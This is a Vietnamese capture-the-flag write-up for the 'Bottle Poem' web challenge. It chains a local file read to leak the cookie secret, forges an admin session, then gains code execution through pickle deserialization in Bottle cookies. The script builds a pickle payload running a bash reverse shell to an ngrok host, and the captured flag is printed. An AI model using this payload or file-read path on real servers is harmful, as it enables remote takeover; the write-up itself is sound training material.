# Bottle Poem

Mở burp, và check tab http history dễ thấy ta có thể khai thác local file read (LFR) tại `/show?id=`

![LFR](https://user-images.githubusercontent.com/77546253/193604811-6f66b999-6627-4c31-aa56-82927b1f6957.png)

Tiếp tục fuzz ta có thể lấy được source file main của server

![app_py](https://user-images.githubusercontent.com/77546253/193604841-3e55f2a3-dd19-49a1-a341-8ba35b613038.png)

Điều làm mình để ý đó là đoạn code sau trong route `/sign`

```python
@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"
```

Nếu `session["name"]=="admin"` thì sẽ render ra một template riêng cho admin, lúc này mình nghĩ tới cách forge session thành admin, nếu làm vậy thì ta sẽ phải cần có secret. May thay secret này được import từ `from config.secret import sekai`

-> read file này tại `/proc/self/cwd/config.secret.py`

![secret_py](https://user-images.githubusercontent.com/77546253/193604875-fa747bb1-aa30-430a-a6d1-d3a032aa1349.png)

Nhưng sau khi forge thành công thì chỉ nhận lại dòng chữ `Hello, you are admin, but it’s useless.`, nhìn lại description thì thấy tác giả có đề cập về `Flag is executable on server.` -> execute file này để lấy flag -> phải rce

Mình bay vào source của bottle, và để ý trong file `bottle.py` có import pickle và dùng chúng trong việc set_cookie cũng như get_cookie

![get_cookie](https://user-images.githubusercontent.com/77546253/193604971-69579aae-0bfd-418a-9629-098b2765b0fc.png)

=> lợi dụng pickle deserialization trong python để rce

script:

```python
import pickle
import base64
import os
 
 
class shell(object):
    def __reduce__(self):  
       return (os.system, ("bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/10709 0>&1'",))

from bottle import route, run, template, request, response, error

@route('/')
def hello():
    sekai='Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu'
    response.set_cookie("name", shell(), secret=sekai)

    return "Hello World!"

run(host='localhost', port=1111, debug=True)
```

và flag: `SEKAI{W3lcome_To_Our_Bottle}`
